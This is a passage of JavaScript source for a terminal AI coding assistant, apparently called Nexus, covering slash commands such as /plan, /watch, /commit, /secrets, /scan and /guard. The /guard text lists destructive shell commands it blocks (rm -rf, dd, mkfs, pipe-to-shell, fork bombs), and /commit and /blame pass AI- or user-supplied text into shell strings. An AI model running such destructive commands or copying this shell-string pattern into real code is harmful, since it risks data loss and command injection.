        if (e === "claude") { let inTok = 0, outTok = 0, cost = 0, txt = ""; await runClaudeStream(prompt, cwd, false, { onText: (t) => { txt += t; }, onResult: (ev) => { const u = ev.usage || {}; inTok = (u.input_tokens || 0) + (u.cache_read_input_tokens || 0) + (u.cache_creation_input_tokens || 0); outTok = u.output_tokens || 0; if (typeof ev.total_cost_usd === "number") cost = ev.total_cost_usd; } }, ctl, { readonly: true }); resolve({ e, ms: Date.now() - s, inTok, outTok, cost, real: true }); }
        else { let out = ""; try { if (e === "ollama") { const mdl = sess.model && sess.model !== engine ? sess.model : pickCoderModel(await ollamaTags()); out = await ollamaChat(mdl, [{ role: "user", content: prompt }], undefined, aSignal(ctl)); } else { out = (await runEngineTask(e, prompt, cwd, false, false, null, ctl)).output; } } catch (_) {} resolve({ e, ms: Date.now() - s, inTok: Math.ceil(prompt.length / 4), outTok: Math.ceil((out || "").length / 4), cost: 0, real: false }); }
      })(); });
      Promise.all(members.map((e, i) => Promise.race([benchOne(e), new Promise((r) => setTimeout(() => r({ e, ms: 60000, inTok: 0, outTok: 0, cost: 0, real: false, to: true }), 60000))]).then((r) => { cards[i].status = r.to ? "err" : "ok"; cards[i].end = Date.now(); render(); return r; })))
        .then((res) => {
          res.sort((a, b) => a.ms - b.ms);
          const fastest = res[0] && res[0].e;
          const pad = (s, n) => (s + " ".repeat(n)).slice(0, n);
          let tbl = pad("engine", 10) + pad("time", 9) + pad("in", 8) + pad("out", 8) + "cost\n";
          for (const r of res) tbl += pad(r.e + (r.e === fastest ? " *" : ""), 10) + pad((r.ms / 1000).toFixed(1) + "s", 9) + pad((r.real ? "" : "~") + fmtK(r.inTok), 8) + pad((r.real ? "" : "~") + fmtK(r.outTok), 8) + (r.real ? (r.cost ? "$" + r.cost.toFixed(4) : "-") : "free") + "\n";
          ensureText().full = "benchmark (* = fastest; ~ = estimated; claude tokens/cost are real):\n\n" + tbl;
          busy = false; ctl = null; block.summary = res.length + " engines benchmarked  ·  " + ((Date.now() - t0) / 1000).toFixed(1) + "s"; try { saveSession(); } catch (_) {} render();
        });
    };
    // /plan — generate an editable, executable task checklist
    const planGen = (goal) => {
      transcript.push({ role: "user", text: "/plan  " + goal });
      const block = { role: "nexus", items: [] }; transcript.push(block);
      scroll = 0; busy = true; busyStart = Date.now(); busyWord = "Planning"; ctl = makeCtl();
      const card = { type: "tool", id: "pl", name: "Task", label: "Task(plan)", status: "run", start: Date.now() }; block.items.push(card); startTick(); render();
      (async () => {
        let mdl = ""; if (engine === "ollama") mdl = sess.model && sess.model !== engine ? sess.model : pickCoderModel(await ollamaTags());
        let tasks = []; try { tasks = await planGoal(engine, mdl, goal, nexusMd); } catch (_) {}
        plan = (tasks || []).map((t) => ({ text: String(t.title || t).slice(0, 300), done: false })); savePlan();
        card.status = "ok"; card.end = Date.now();
        ensureText().full = "planned " + plan.length + " task(s). /plan run to execute · /plan done <n> to check off · /plan add <text> to add.";
        busy = false; ctl = null; transcript.push({ role: "plan" }); try { saveSession(); } catch (_) {} render();
      })();
    };
    const runPlan = () => {
      if (!plan.some((t) => !t.done)) { transcript.push({ role: "system", text: "no unfinished tasks in the plan" }); render(); return; }
      transcript.push({ role: "user", text: "/plan run" });
      const block = { role: "nexus", items: [] }; transcript.push(block);
      const ck = nexusCheckpoint(cwd); if (ck) checkpoints.push({ tree: ck, label: "plan run", ts: Date.now() });
      scroll = 0; busy = true; busyStart = Date.now(); busyWord = "Executing"; ctl = makeCtl(); startTick(); render();
      (async () => {
        for (let i = 0; i < plan.length; i++) {
          if (ctl && ctl.stopped) break;
          const t = plan[i]; if (t.done) continue;
          t.running = true; const card = { type: "tool", id: "pt" + i, name: "Task", label: "Task(" + oneline(t.text, 30) + ")", status: "run", start: Date.now() }; block.items.push(card); activeAgents = 1; render();
          let taskModel; if (cowork.on && engine === "claude") { const mech = isMechanical(t.text); const est = Math.ceil(t.text.length / 4) + 800; taskModel = (mech && shouldDelegate(est, est * 4, cowork.strong, cowork.weak)) ? cowork.weak : cowork.strong; if (taskModel === cowork.weak) { impact.delegated++; impact.coworkSaved += (priceOf(cowork.strong).out - priceOf(cowork.weak).out) * (est * 3) / 1e6; card.label += " " + gray("· " + cowork.weak); } }
          try { if (engine === "ollama") { const mdl = sess.model && sess.model !== engine ? sess.model : pickCoderModel(await ollamaTags()); await ollamaExec(mdl, t.text, "", cwd, aSignal(ctl)); } else { await runEngineTask(engine, t.text, cwd, true, false, null, ctl, taskModel); } } catch (_) {}
          t.running = false; t.done = true; savePlan(); card.status = "ok"; card.end = Date.now(); activeAgents = 0; render();
        }
        ensureText().full = plan.every((t) => t.done) ? "all plan tasks completed." : "stopped — some tasks remain (/plan run to resume).";
        busy = false; ctl = null; transcript.push({ role: "plan" }); try { saveSession(); } catch (_) {} maybeAutoCompact(); render();
      })();
    };
    // /watch <cmd> — run a command; if it fails, have the engine fix the code and re-run, up to 5 tries
    const watchFix = (command) => {
      transcript.push({ role: "user", text: "/watch  " + command });
      const block = { role: "nexus", items: [] }; transcript.push(block);
      const t0 = Date.now(); scroll = 0; busy = true; busyStart = Date.now(); busyWord = "Watching"; ctl = makeCtl();
      const ck = nexusCheckpoint(cwd); if (ck) checkpoints.push({ tree: ck, label: "watch " + command, ts: Date.now() });
      startTick(); render();
      (async () => {
        let passed = false, attempts = 0;
        for (let att = 1; att <= 5 && !(ctl && ctl.stopped); att++) {
          attempts = att;
          const rc = { type: "tool", id: "wr" + att, name: "Bash", label: "Bash(" + oneline(command, 40) + ")", status: "run", start: Date.now() }; block.items.push(rc); render();
          const r = await coderShell(command, cwd); rc.status = r.code === 0 ? "ok" : "err"; rc.end = Date.now(); rc.detail = oneline(r.output, 260); render();
          if (r.code === 0) { const t = ensureText(); t.full += (t.full ? "\n" : "") + "command passed on attempt " + att + "."; passed = true; break; }
          if (att === 5) break;
          const t = ensureText(); t.full += (t.full ? "\n" : "") + "attempt " + att + " failed — asking " + engine + " to fix…"; render();
          const fc = { type: "tool", id: "wf" + att, name: "Task", label: "Task(fix attempt " + att + ")", status: "run", start: Date.now() }; block.items.push(fc); activeAgents = 1; render();
          const fixPrompt = "The command `" + command + "` is failing. Its output was:\n\n" + (r.output || "").slice(-3000) + "\n\nEdit the code so the command passes. Make the file edits now — do not ask questions.";
          try { if (engine === "ollama") { const mdl = sess.model && sess.model !== engine ? sess.model : pickCoderModel(await ollamaTags()); await ollamaExec(mdl, fixPrompt, "", cwd, aSignal(ctl)); } else { await runEngineTask(engine, fixPrompt, cwd, true, false, null, ctl); } } catch (_) {}
          fc.status = "ok"; fc.end = Date.now(); activeAgents = 0; render();
        }
        for (const it of block.items) if (it.status === "run") { it.status = "ok"; it.end = Date.now(); }
        const t = ensureText(); t.full += (passed ? "\n\nAll green." : "\n\nStill failing after " + attempts + " attempt(s) — review the output above.");
        busy = false; ctl = null; block.summary = "watch  ·  " + attempts + " attempt(s)  ·  " + ((Date.now() - t0) / 1000).toFixed(1) + "s" + (ck ? "  ·  undo #" + checkpoints.length : "");
        try { saveSession(); } catch (_) {} maybeAutoCompact(); render();
      })();
    };
    // /commit — write an AI commit message for the working diff and commit
    const commitChanges = () => {
      let diff = ""; try { _cp.execSync("git add -A", { cwd, stdio: "ignore" }); diff = _cp.execSync("git diff --cached", { cwd, encoding: "utf8" }); } catch (_) { transcript.push({ role: "system", text: "/commit needs a git repo" }); render(); return; }
      if (!diff.trim()) { transcript.push({ role: "system", text: "nothing to commit" }); render(); return; }
      transcript.push({ role: "user", text: "/commit" });
      const block = { role: "nexus", items: [] }; transcript.push(block);
      scroll = 0; busy = true; busyStart = Date.now(); busyWord = "Composing"; ctl = makeCtl();
      const card = { type: "tool", id: "cm", name: "Task", label: "Task(commit message)", status: "run", start: Date.now() }; block.items.push(card); startTick(); render();
      (async () => {
        const prompt = "Write a Conventional-Commits message for this diff: a single subject line under 72 chars (type: summary), optionally a short body. Output ONLY the message, no backticks, no preamble.\n\n" + diff.slice(0, 6000);
        let msg = ""; try { if (engine === "ollama") { const mdl = sess.model && sess.model !== engine ? sess.model : pickCoderModel(await ollamaTags()); msg = await ollamaChat(mdl, [{ role: "user", content: prompt }], undefined, aSignal(ctl)); } else { msg = (await runEngineTask(engine, prompt, cwd, false, false, null, ctl, auxModel())).output; } } catch (_) {}
        msg = (msg || "").replace(/```[a-z]*\n?|```/g, "").trim().split("\n").slice(0, 8).join("\n").trim() || "chore: update";
        card.status = "ok"; card.end = Date.now();
        let done = false; try { const subj = msg.split("\n")[0], body = msg.split("\n").slice(1).join("\n").trim(); _cp.execSync("git commit -m " + JSON.stringify(subj) + (body ? " -m " + JSON.stringify(body) : ""), { cwd, stdio: "ignore" }); done = true; } catch (_) {}
        ensureText().full = (done ? "committed:\n\n" : "generated message (commit failed — commit manually):\n\n") + msg;
        busy = false; ctl = null; try { saveSession(); } catch (_) {} render();
      })();
    };
    // ---- slash commands ----
    const saveSession = () => { try { fs.mkdirSync(path.join(cwd, ".nexus"), { recursive: true }); fs.writeFileSync(path.join(cwd, ".nexus", "session.json"), JSON.stringify({ engine, model: sess.model, transcript, sess, ts: Date.now() })); } catch (_) {} };
    const handleSlash = (t) => {
      const sp = t.indexOf(" ");
      const cmd = (sp === -1 ? t : t.slice(0, sp)).toLowerCase();
      const argstr = sp === -1 ? "" : t.slice(sp + 1).trim();
      const arg = argstr.split(/\s+/)[0];
      if (customCmds[cmd]) { let body = customCmds[cmd].body.replace(/\$ARGUMENTS/g, argstr).replace(/\$(\d+)/g, (_, n) => argstr.split(/\s+/)[+n - 1] || ""); submit(body); return; }
      if (cmd === "/help") transcript.push({ role: "system", text: "core:  /help /clear /compact /context /cost /budget /undo /redo /rewind /checkpoints /resume /export /copy /status /doctor /init /model /engine /commands /expand /exit\nunique:  /cowork (save cost: strong+weak model) · /race · /ensemble · /bench · /review · /watch · /plan · /guard · /impact · /gaps · /dream · /commit · /diff · /git · /blame · /explain · /test · /index · /snippet · /pin · /secrets · /scan · /agents a ;; b · /tree · /theme · /offline · /redact\ninput:  @file (Tab-completes paths) · !cmd shell · #note memory · end a line with \\ for a newline · MCP & /hooks from .nexus/\nkeys:  shift+tab mode · ctrl+o expand · ctrl+c stop · ↑/↓ history · wheel/PgUp/PgDn/Home/End scroll · / menu" });
      else if (cmd === "/commands") { const ks = Object.keys(customCmds); transcript.push({ role: "system", text: ks.length ? ("custom commands (from .nexus/commands or .claude/commands):\n" + ks.map((k) => "  " + k + "  " + customCmds[k].desc.replace(/ \(custom\)$/, "")).join("\n")) : "no custom commands yet — add a file like .nexus/commands/review.md, then use /review" }); }
      else if (cmd === "/mcp") {
        if (arg === "connect" || arg === "reconnect") { mcpServers = []; connectMcp().then(() => render()); transcript.push({ role: "system", text: "connecting to MCP servers from .nexus/mcp.json…" }); }
        else if (!loadMcpConfig(cwd)) transcript.push({ role: "system", text: "no MCP servers configured. Create .nexus/mcp.json (or .mcp.json):\n  { \"mcpServers\": { \"name\": { \"command\": \"npx\", \"args\": [\"-y\", \"@modelcontextprotocol/server-...\"] } } }\nThe claude engine reads .mcp.json natively; the local engine gets these tools too." });
        else if (!mcpServers.length) transcript.push({ role: "system", text: "MCP servers are still connecting… run /mcp again in a moment" });
        else transcript.push({ role: "system", text: "MCP servers:\n" + mcpServers.map((s) => s.error ? ("  " + s.name + "  — error: " + s.error) : ("  " + s.name + "  — " + (s.tools || []).length + " tool(s): " + (s.tools || []).map((t) => t.name).slice(0, 8).join(", "))).join("\n") + "\nthe local engine can call these as mcp__<server>__<tool>" }); }
      else if (cmd === "/agents" || cmd === "/parallel") { const tasks = argstr.split(/\s*;;\s*/).map((s) => s.trim()).filter(Boolean); if (tasks.length < 2) transcript.push({ role: "system", text: "usage: /agents <task 1> ;; <task 2> ;; …   — runs each task in parallel on the " + engine + " engine, each in its own isolated git worktree, then merges the changes back" }); else spawnAgents(tasks); }
      else if (cmd === "/hooks") { transcript.push({ role: "system", text: hooks ? ("hooks (.nexus/hooks.json) active for events: " + Object.keys(hooks).join(", ") + "\n  PreToolUse/PostToolUse run for the local engine; UserPromptSubmit & Stop run for every engine") : "no hooks configured. Create .nexus/hooks.json:\n  { \"PreToolUse\": [ { \"matcher\": \"run_command|write_file\", \"command\": \"echo $TOOL_NAME >> .nexus/audit.log\" } ] }\n  events: UserPromptSubmit · PreToolUse · PostToolUse · Stop  (non-zero exit on PreToolUse/UserPromptSubmit blocks the action)" }); }
      else if (cmd === "/status") transcript.push({ role: "system", text: "status:\n  engine   " + engine + (sess.model && sess.model !== engine ? " (" + sess.model + ")" : "") + "\n  dir      " + cwd + "\n  mode     " + MODES[mode].k + "\n  context  " + Math.round((sess.ctxUsed / (sess.ctxWindow || 1)) * 100) + "% of " + fmtK(sess.ctxWindow) + "\n  tokens   ↑" + fmtK(sess.inTok) + " ↓" + fmtK(sess.outTok) + (PAID[engine] ? (sess.cost ? " · $" + sess.cost.toFixed(4) : " · billed") : " · local · free") + "\n  budget   " + (costCap ? "$" + costCap.toFixed(2) + " cap" : "none") + "\n  undo     " + checkpoints.length + " checkpoint(s)" });
      else if (cmd === "/doctor") transcript.push({ role: "system", text: "doctor:\n  claude CLI   " + (hasBin("claude") ? "found" : "not found (needed for the claude engine)") + "\n  opencode     " + (hasBin("opencode") ? "found" : "not found") + "\n  git          " + (hasBin("git") ? "found — /undo & checkpoints active" : "not found — /undo disabled") + "\n  node         " + process.version + "\n  ollama is checked live when you switch to it" });
      else if (cmd === "/resume") { try { const s = JSON.parse(fs.readFileSync(path.join(cwd, ".nexus", "session.json"), "utf8")); transcript.length = 0; for (const b of s.transcript) transcript.push(b); if (s.sess) Object.assign(sess, s.sess); cont = true; scroll = 0; transcript.push({ role: "system", text: "resumed the saved session from " + new Date(s.ts).toLocaleString() }); } catch (_) { transcript.push({ role: "system", text: "no saved session to resume (sessions are saved to .nexus/session.json after each turn)" }); } }
      else if (cmd === "/export") { try { const L = ["# Nexus conversation", "", "_" + new Date().toLocaleString() + " · " + engine + " · " + cwd + "_", ""]; for (const m of transcript) { if (m.role === "user") L.push("## You", "", m.text, ""); else if (m.role === "nexus") { L.push("## Nexus", ""); for (const it of (m.items || [])) { if (it.type === "text") L.push(it.full); else if (it.type === "tool") L.push("- `" + it.label + "`"); } L.push(""); } else if (m.role === "system") L.push("> " + String(m.text).replace(/\n/g, " "), ""); } const fp = path.join(cwd, "nexus-" + new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19) + ".md"); fs.writeFileSync(fp, L.join("\n")); transcript.push({ role: "system", text: "exported conversation → " + path.relative(cwd, fp) }); } catch (e) { transcript.push({ role: "system", text: "export failed: " + e.message }); } }
      else if (cmd === "/copy") { let last = ""; for (let i = transcript.length - 1; i >= 0; i--) { const m = transcript[i]; if (m.role === "nexus") { last = (m.items || []).filter((it) => it.type === "text").map((it) => it.full).join("\n").trim(); if (last) break; } } if (last) { out.write("\x1b]52;c;" + Buffer.from(last).toString("base64") + "\x07"); transcript.push({ role: "system", text: "copied Nexus's last reply to the clipboard" }); } else transcript.push({ role: "system", text: "nothing to copy yet" }); }
      else if (cmd === "/rewind") { if (!checkpoints.length) transcript.push({ role: "system", text: "no checkpoints to rewind to" }); else { const n = parseInt(arg, 10); const idx = isNaN(n) ? checkpoints.length - 1 : n - 1; const ck = checkpoints[idx]; if (!ck) transcript.push({ role: "system", text: "no checkpoint #" + arg + " — /checkpoints to list them" }); else { const ok = nexusRestore(cwd, ck.tree, ck.paths); if (ok) checkpoints.length = idx; transcript.push({ role: "system", text: ok ? ("rewound to checkpoint #" + (idx + 1) + " (before \"" + ck.label + "\") — restored " + ((ck.paths && ck.paths.length) ? ck.paths.length + " file(s) Nexus changed" : "the working tree")) : "rewind failed (git error)" }); } } }
      else if (cmd === "/clear" || cmd === "/new") { transcript.length = 0; transcript.push({ role: "art" }, { role: "system", text: "new chat  ·  " + engine + "  ·  " + cwd }); cont = false; oMsgs.length = 1; sess.ctxUsed = 0; scroll = 0; }
      else if (cmd === "/compact") doCompact(false);
      else if (cmd === "/context") transcript.push({ role: "system", text: "context: " + fmtK(sess.ctxUsed) + " / " + fmtK(sess.ctxWindow) + " tokens (" + Math.round((sess.ctxUsed / (sess.ctxWindow || 1)) * 100) + "%)  ·  window " + fmtK(sess.ctxWindow) });
      else if (cmd === "/cost") transcript.push({ role: "system", text: PAID[engine] ? ("session: ↑" + fmtK(sess.inTok) + " in · ↓" + fmtK(sess.outTok) + " out" + (sess.cost ? " · $" + sess.cost.toFixed(4) : "") + (costCap ? " · cap $" + costCap.toFixed(2) : "")) : "engine is local (Ollama) — free, no token charges" });
      else if (cmd === "/budget") { const v = parseFloat(arg); if (arg && !isNaN(v) && v > 0) { costCap = v; transcript.push({ role: "system", text: "budget cap set to $" + v.toFixed(2) + " — turns pause when session cost reaches it" }); } else if (arg === "off" || arg === "0") { costCap = 0; transcript.push({ role: "system", text: "budget cap removed" }); } else transcript.push({ role: "system", text: "usage: /budget <usd>  (e.g. /budget 5.00, or /budget off)" }); }
      else if (cmd === "/undo") { if (!checkpoints.length) transcript.push({ role: "system", text: "nothing to undo (no checkpoints this session, or not a git repo)" }); else { const ck = checkpoints.pop(); const nowTree = nexusCheckpoint(cwd); const ok = nexusRestore(cwd, ck.tree, ck.paths); if (ok && nowTree) redoStack.push({ tree: nowTree, label: ck.label, paths: ck.paths }); transcript.push({ role: "system", text: ok ? ("undid \"" + ck.label + "\" — restored " + ((ck.paths && ck.paths.length) ? ck.paths.length + " file(s) Nexus changed this turn (unrelated edits untouched)" : "the working tree") + " (/redo to reapply)") : "undo failed (git error)" }); } }
      else if (cmd === "/redo") { const r = redoStack.pop(); if (!r) transcript.push({ role: "system", text: "nothing to redo" }); else { const ok = nexusRestore(cwd, r.tree, r.paths); if (ok) checkpoints.push({ tree: r.tree, label: r.label, ts: Date.now(), paths: r.paths }); transcript.push({ role: "system", text: ok ? ("redid — reapplied the changes from \"" + r.label + "\"") : "redo failed (git error)" }); } }
      else if (cmd === "/race") { if (!argstr) transcript.push({ role: "system", text: "usage: /race <prompt>  — runs it on every available engine (claude/local/opencode) at once and shows all answers" }); else raceEngines(argstr); }
      else if (cmd === "/review") { reviewLast(arg); }
      else if (cmd === "/secrets") { try { const files = _cp.execSync("git ls-files", { cwd, encoding: "utf8" }).split("\n").filter(Boolean).slice(0, 3000); const found = []; for (const f of files) { try { if (fs.statSync(path.join(cwd, f)).size > 400000) continue; const hits = scanSecrets(fs.readFileSync(path.join(cwd, f), "utf8")); if (hits.length) found.push("  " + f + " — " + hits.join(", ")); } catch (_) {} } transcript.push({ role: "system", text: found.length ? ("possible secrets found in tracked files:\n" + found.slice(0, 40).join("\n")) : "scanned tracked files — no obvious secrets found" }); } catch (_) { transcript.push({ role: "system", text: "/secrets needs a git repo (uses git ls-files)" }); } }
      else if (cmd === "/scan") { const host = arg || "127.0.0.1"; const COMMON = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 6379, 8080, 8443, 9000]; transcript.push({ role: "system", text: "scanning " + host + " (" + COMMON.length + " common TCP ports)…" }); render(); quickScan(host, COMMON).then((open) => { transcript.push({ role: "system", text: open.length ? ("open on " + host + ": " + open.join(", ")) : "no common ports open on " + host }); render(); }); }
      else if (cmd === "/notify") { notify = !notify; transcript.push({ role: "system", text: "completion notifications " + (notify ? "ON — a bell rings (and a desktop notification) when a turn over ~15s finishes, so you can step away" : "off") }); }
      else if (cmd === "/watch") { if (!argstr) transcript.push({ role: "system", text: "usage: /watch <command>  — runs it, and if it fails has " + engine + " fix the code and re-run, up to 5 times (e.g. /watch npm test)" }); else watchFix(argstr); }
      else if (cmd === "/commit") commitChanges();
      else if (cmd === "/diff") { let d = ""; try { d = _cp.execSync("git -c color.ui=never diff HEAD", { cwd, encoding: "utf8" }); } catch (_) { try { d = _cp.execSync("git -c color.ui=never diff", { cwd, encoding: "utf8" }); } catch (__) {} } if (!d.trim()) transcript.push({ role: "system", text: "no changes vs HEAD (working tree clean)" }); else transcript.push({ role: "diff", text: d.slice(0, 24000) }); }
      else if (cmd === "/pin") { if (!arg) transcript.push({ role: "system", text: "usage: /pin <file>  — keeps that file in context on every turn" }); else if (!fs.existsSync(path.resolve(cwd, arg))) transcript.push({ role: "system", text: "no such file: " + arg }); else { pinned.add(arg); transcript.push({ role: "system", text: "pinned " + arg + " — its contents are added to every prompt now (" + pinned.size + " pinned)" }); } }
      else if (cmd === "/unpin") { if (arg && pinned.delete(arg)) transcript.push({ role: "system", text: "unpinned " + arg }); else if (arg === "all") { pinned.clear(); transcript.push({ role: "system", text: "unpinned all" }); } else transcript.push({ role: "system", text: "not pinned: " + arg + "  (/unpin all clears everything)" }); }
      else if (cmd === "/pins") transcript.push({ role: "system", text: pinned.size ? ("pinned files (in context every turn):\n" + [...pinned].map((f) => "  " + f).join("\n")) : "no pinned files — /pin <file> to add one" });
      else if (cmd === "/redact") { redact = !redact; transcript.push({ role: "system", text: "cloud redaction " + (redact ? "ON — secrets (API keys, tokens, private keys) are masked before anything is sent to a cloud engine (claude/opencode); local engine is unaffected" : "off") }); }
      else if (cmd === "/ensemble") { if (!argstr) transcript.push({ role: "system", text: "usage: /ensemble <prompt> — asks every engine, then synthesizes the single best answer" }); else ensembleEngines(argstr); }
      else if (cmd === "/bench") { if (!argstr) transcript.push({ role: "system", text: "usage: /bench <prompt> — runs it on each engine and reports a speed / tokens / cost table" }); else benchEngines(argstr); }
      else if (cmd === "/guard") { if (["enforce", "warn", "off"].includes(arg)) { guard = arg; transcript.push({ role: "system", text: "Sentinel guard set to " + arg + (arg === "enforce" ? " — destructive agent commands (rm -rf, git reset --hard, dd, mkfs, pipe-to-shell, fork bombs, …) are blocked" : arg === "warn" ? " — destructive commands are flagged but allowed" : " — destructive-command checks disabled") }); } else transcript.push({ role: "system", text: "Sentinel guard is " + guard + ".  usage: /guard enforce|warn|off  — preflights the local agent's shell commands for destructive intent" }); }
      else if (cmd === "/cowork") { const pp = argstr.split(/\s+/).filter(Boolean);
        if (pp[0] === "off") { cowork = { on: false, strong: "", weak: "" }; transcript.push({ role: "system", text: "cowork off — single-model mode" }); }
        else if (pp.length >= 2 && pp[0] !== pp[1]) { cowork = { on: true, strong: pp[0], weak: pp[1] }; transcript.push({ role: "system", text: "cowork ON — " + pp[0] + " does the coding; " + pp[1] + " handles cheap/mechanical work (tests, builds, commit messages, reviews, plan steps) whenever the CLI estimates it saves more than the delegation overhead. Claude Code's background model is also pointed at " + pp[1] + ", so " + pp[0] + " burns fewer tokens on summaries/classification." + (engine !== "claude" ? "\n(note: cowork only applies to the claude engine — /engine claude to use it)" : "") }); }
        else if (pp.length) transcript.push({ role: "system", text: "cowork needs two DIFFERENT models (same model is just normal claude).  usage: /cowork <strong-model> <weak-model>  —  e.g. /cowork opus haiku  or  /cowork claude-opus-4-8 claude-haiku-4-5" });
        else transcript.push({ role: "system", text: cowork.on ? ("cowork: " + cowork.strong + " (code) + " + cowork.weak + " (cheap work) — " + impact.delegated + " task(s) delegated so far") : "cowork off.  usage: /cowork <strong> <weak>  ·  e.g. /cowork opus haiku  ·  /cowork off" }); }
      else if (cmd === "/impact") { const BLEND = 6; const avoided = (impact.localTok / 1e6) * BLEND; transcript.push({ role: "system", text: "Impact Receipt (this session):\n  local turns   " + impact.localTurns + "   free · ~" + fmtK(impact.localTok) + " tokens\n  cloud turns   " + impact.cloudTurns + "   ↑" + fmtK(impact.cloudInTok) + " ↓" + fmtK(impact.cloudOutTok) + " tok · $" + impact.cloudCost.toFixed(4) + "\n  cost avoided  ~$" + avoided.toFixed(4) + "   (est. if those local turns had run on the cloud @ ~$" + BLEND + "/M tokens)" + (cowork.on || impact.delegated ? "\n  cowork        " + impact.delegated + " task(s) delegated to " + (cowork.weak || "the weak model") + " · ~$" + impact.coworkSaved.toFixed(4) + " saved" : "") + "\n  net: spent $" + impact.cloudCost.toFixed(4) + ", avoided ~$" + (avoided + impact.coworkSaved).toFixed(4) }); }
      else if (cmd === "/gaps") { try { const files = _cp.execSync("git ls-files", { cwd, encoding: "utf8" }).split("\n").filter(Boolean); const found = []; for (const f of files) { try { if (fs.statSync(path.join(cwd, f)).size > 400000) continue; const lines = fs.readFileSync(path.join(cwd, f), "utf8").split("\n"); for (let i = 0; i < lines.length; i++) { const m = lines[i].match(/\b(TODO|FIXME|HACK|XXX|BUG)\b[:\s-]*(.*)/); if (m) found.push({ file: f, line: i + 1, kind: m[1], text: (m[2] || "").trim().slice(0, 80) }); } } catch (_) {} } if (arg === "plan") { if (!found.length) transcript.push({ role: "system", text: "no gaps to turn into a plan" }); else { plan = found.slice(0, 30).map((g) => ({ text: "resolve " + g.kind + " in " + g.file + ":" + g.line + (g.text ? " — " + g.text : ""), done: false })); savePlan(); transcript.push({ role: "system", text: "turned " + plan.length + " gap(s) into a plan — /plan run to work through them" }); transcript.push({ role: "plan" }); } } else transcript.push({ role: "system", text: found.length ? ("gaps (" + found.length + " TODO/FIXME/HACK/XXX/BUG):\n" + found.slice(0, 40).map((g) => "  " + g.file + ":" + g.line + "  " + g.kind + (g.text ? " " + g.text : "")).join("\n") + (found.length > 40 ? "\n  … and " + (found.length - 40) + " more" : "") + "\n/gaps plan turns these into a checklist") : "no TODO/FIXME/HACK/XXX/BUG markers in tracked files" }); } catch (_) { transcript.push({ role: "system", text: "/gaps needs a git repo (uses git ls-files)" }); } }
      else if (cmd === "/dream") { const conv = transcript.filter((m) => m.role === "user" || m.role === "nexus").slice(-16); if (!conv.length) { transcript.push({ role: "system", text: "nothing to consolidate yet — have a conversation first" }); render(); return; } transcript.push({ role: "user", text: "/dream" }); const block = { role: "nexus", items: [] }; transcript.push(block); scroll = 0; busy = true; busyStart = Date.now(); busyWord = "Dreaming"; ctl = makeCtl(); const card = { type: "tool", id: "dr", name: "Task", label: "Task(consolidate memory)", status: "run", start: Date.now() }; block.items.push(card); startTick(); render(); (async () => {
        const digest = conv.map((m) => m.role === "user" ? "USER: " + m.text : "NEXUS: " + (m.items || []).filter((it) => it.type === "text").map((it) => it.full).join(" ")).join("\n").slice(0, 8000);
        let out = ""; try { out = await engineAnswer(offline ? "ollama" : engine, "From this coding session, extract 3-8 durable, reusable facts about THIS project (conventions, gotchas, key files, decisions). Output ONLY bullet points, one per line starting with '- '. No preamble.\n\n" + digest); } catch (_) {}
        const bullets = (out || "").split("\n").map((l) => l.trim()).filter((l) => /^[-*]\s/.test(l)).map((l) => l.replace(/^[*]\s/, "- "));
        card.status = "ok"; card.end = Date.now();
        if (bullets.length) { try { const md = path.join(cwd, ".nexus", "NEXUS.md"); fs.mkdirSync(path.join(cwd, ".nexus"), { recursive: true }); let c = ""; try { c = fs.readFileSync(md, "utf8"); } catch (_) {} if (!/\n##\s*Notes/.test(c)) c += (c && !c.endsWith("\n") ? "\n" : "") + "\n## Notes\n"; const lc = c.toLowerCase(); const added = []; for (const b of bullets) { const key = b.toLowerCase().replace(/[^a-z0-9 ]/g, "").slice(0, 28); if (key.length > 8 && !lc.includes(key)) { c += b + "\n"; added.push(b); } } fs.writeFileSync(md, c); ensureText().full = added.length ? ("consolidated " + added.length + " new fact(s) into .nexus/NEXUS.md:\n\n" + added.join("\n")) : "reviewed the session — everything's already in NEXUS.md"; } catch (e) { ensureText().full = "could not write memory: " + e.message; } } else ensureText().full = "no durable facts found to consolidate.";
        busy = false; ctl = null; try { saveSession(); } catch (_) {} render();
      })(); }
      else if (cmd === "/plan") { const s = arg;
        if (!s) { if (plan.length) transcript.push({ role: "plan" }); else transcript.push({ role: "system", text: "no plan yet — /plan <goal> to create an executable checklist" }); }
        else if (s === "run") runPlan();
        else if (s === "clear") { plan = []; savePlan(); transcript.push({ role: "system", text: "plan cleared" }); }
        else if (s === "add") { const txt = argstr.split(/\s+/).slice(1).join(" "); if (txt) { plan.push({ text: txt, done: false }); savePlan(); transcript.push({ role: "plan" }); } else transcript.push({ role: "system", text: "usage: /plan add <task text>" }); }
        else if (s === "done") { const n = parseInt(argstr.split(/\s+/)[1], 10); if (plan[n - 1]) { plan[n - 1].done = !plan[n - 1].done; savePlan(); transcript.push({ role: "plan" }); } else transcript.push({ role: "system", text: "no task #" + argstr.split(/\s+/)[1] }); }
        else planGen(argstr); }
      else if (cmd === "/git") { try { const br = _cp.execSync("git branch --show-current", { cwd, encoding: "utf8" }).trim(); const st = _cp.execSync("git -c color.ui=never status --porcelain", { cwd, encoding: "utf8" }).trim(); const log = _cp.execSync("git -c color.ui=never log --oneline -8", { cwd, encoding: "utf8" }).trim(); transcript.push({ role: "system", text: "branch: " + (br || "(detached)") + "\n\nstatus:\n" + (st ? st.split("\n").map((l) => "  " + l).join("\n") : "  working tree clean") + "\n\nrecent commits:\n" + log.split("\n").map((l) => "  " + l).join("\n") }); } catch (_) { transcript.push({ role: "system", text: "not a git repo (or git not installed)" }); } }
      else if (cmd === "/blame") { if (!arg) transcript.push({ role: "system", text: "usage: /blame <file>  — shows who last changed each of the first lines" }); else { try { const b = _cp.execSync("git blame -L 1,40 --date=short -- " + JSON.stringify(arg), { cwd, encoding: "utf8" }); transcript.push({ role: "system", text: "blame " + arg + " (first 40 lines):\n" + b.replace(/\n+$/, "") }); } catch (e) { transcript.push({ role: "system", text: "blame failed: " + String(e.message).split("\n")[0] }); } } }
      else if (cmd === "/index") { const n = buildIndex(); transcript.push({ role: "system", text: "indexed " + n + " file(s) → .nexus/index.json. The local engine will now auto-pull the most relevant files into each prompt." }); }
      else if (cmd === "/snippet" || cmd === "/snip") {
        const sub = arg, name = argstr.split(/\s+/)[1], body = argstr.split(/\s+/).slice(2).join(" ");
